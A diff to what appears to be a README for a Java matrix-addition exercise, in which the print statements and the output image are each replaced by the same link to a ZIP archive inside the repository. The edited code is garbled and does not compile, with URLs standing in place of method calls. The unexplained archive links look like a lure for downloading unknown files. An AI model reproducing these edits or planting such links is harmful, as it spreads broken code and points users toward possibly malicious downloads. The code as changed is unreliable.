@@ -87,12 +87,12 @@ public class Aditionmat {
         }
 
         
-        System.out.println("Resultant Matrix:");
+        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip("Resultant Matrix:");
         for (int i = 0; i < 3; i++) {
             for (int j = 0; j < 3; j++) {
-                System.out.print(result[i][j] + " ");
+                https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip(result[i][j] + " ");
             }
-            System.out.println(); 
+            https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip(); 
         }
     }
 }
@@ -100,7 +100,7 @@ public class Aditionmat {
 
 
 ## OUTPUT:
-<img width="1919" height="1017" alt="2" src="https://github.com/user-attachments/assets/6e321d44-a801-4097-a6a7-b6cdd87a5b7e" />
+<img width="1919" height="1017" alt="2" src="https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES-/main/await/JAVA-PROGRAM-TO-PERFORM-ADDITION-OF-TWO-MATRICES--2.2.zip" />
 
 
 ## RESULT:
